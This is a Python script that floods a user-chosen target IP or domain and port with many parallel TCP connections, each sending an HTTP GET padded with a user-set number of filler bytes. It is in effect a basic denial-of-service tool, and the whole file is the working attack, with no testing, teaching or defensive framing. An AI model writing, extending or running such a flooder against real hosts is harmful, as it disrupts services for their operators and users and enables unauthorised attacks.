import socket
import threading

target_ip = input("Enter the target IP/domain: ")
target_port = int(input("Enter the target port: "))
bytes_to_send = int(input("Enter the number of bytes to send in each request: "))
num_threads = int(input("Enter the number of threads: "))
connections_per_thread = int(input("Enter the number of connections per thread: "))

# Resolve domain to IP address
try:
    target_ip = socket.gethostbyname(target_ip)
except socket.gaierror as e:
    print("Failed to resolve domain. Error:", str(e))
    exit()

# Function to send TCP requests
def send_tcp_requests():
    for _ in range(connections_per_thread):
        try:
            # Create a TCP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Connect to the target
            s.connect((target_ip, target_port))

            # Send a TCP request
            request = b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n"
            request += b"A" * bytes_to_send  # Add the specified number of bytes to the request
            s.send(request)

            # Close the socket
            s.close()

        except Exception as e:
            print("An error occurred:", str(e))
            break

# Start the threads
threads = []
for _ in range(num_threads):
    t = threading.Thread(target=send_tcp_requests)
    t.start()
    threads.append(t)

# Wait for all threads to finish
for t in threads:
    t.join()

print("All threads finished.")